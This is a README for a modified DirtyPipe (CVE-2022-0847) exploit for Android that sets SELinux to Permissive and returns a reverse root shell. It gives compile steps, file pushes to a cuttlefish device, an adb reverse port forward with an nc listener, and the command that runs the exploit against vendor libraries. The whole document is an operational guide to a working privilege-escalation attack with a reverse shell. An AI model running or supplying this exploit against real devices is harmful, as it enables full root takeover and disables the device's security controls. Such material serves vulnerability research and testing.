# CVE-2022-0847 - DirtyPipe
This exploit works by modifying the DirtyPipe to craft a two stage payload that can set SELinux to Permissive and return a reverse root shell.
The original exploit from https://github.com/polygraphene/DirtyPipe-Android was modified to remove the magisk dependency altogether as well as set SELinux to Permissive globally.
Note: SELinux must be enforcing when the exploit is run or the loading of the module silently fails.

## Compile
`export ANDROID_NDK=<path/to/android/ndk>`
`export PATH=$PATH:$ANDROID_NDK/toolchains/llvm/prebuilt/linux-x86_64/bin`
`make`

Push the following files to the cuttlefish device:
dirtypipe-android
startup-root


## Trigger
On your host, run:
`bin/adb -s <device_number> reverse tcp:10847 tcp:10847`
`nc -lvnp 10847`

To run the exploit:
`/data/local/tmp/dirtypipe-android -f /vendor/lib/libstagefright_soft_mp3dec.so /product/lib/libgiftranscode.so`


